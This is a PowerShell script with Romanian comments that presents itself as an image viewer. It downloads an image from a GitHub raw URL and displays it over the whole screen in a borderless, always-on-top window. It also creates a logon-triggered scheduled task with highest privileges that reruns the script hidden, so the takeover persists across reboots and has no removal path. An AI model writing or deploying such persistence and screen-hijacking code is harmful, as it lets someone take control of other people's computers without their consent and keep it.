# Configurare URL pentru imagine
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\cdr.png"

# Descărcare imagine
try {
    Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
} catch {
    Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
    exit
}

# Funcție pentru afișarea imaginii pe tot ecranul
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $form = New-Object System.Windows.Forms.Form
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true

    try {
        $img = [System.Drawing.Image]::FromFile($tempImagePath)
    } catch {
        Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
        exit
    }

    $pictureBox = New-Object System.Windows.Forms.PictureBox
    $pictureBox.Image = $img
    $pictureBox.Dock = 'Fill'
    $pictureBox.SizeMode = 'StretchImage'
    $form.Controls.Add($pictureBox)

    $form.KeyDown += {
        if ($_ -and $_.KeyCode -eq 'Escape') {
            exit
        }
    }

    $form.Add_Shown({ $form.Activate() })
    $form.ShowDialog()
}

# Asigură persistența și execuția
function Set-Startup {
    $scriptPath = $MyInvocation.MyCommand.Path
    $taskName = "PersistentImageViewer"

    schtasks /create /tn $taskName /tr "powershell.exe -WindowStyle Hidden -File '$scriptPath'" /sc onlogon /rl highest /f | Out-Null
}

# Setează aplicația să ruleze la startup
Set-Startup

# Afișează imaginea
Show-FullScreenImage
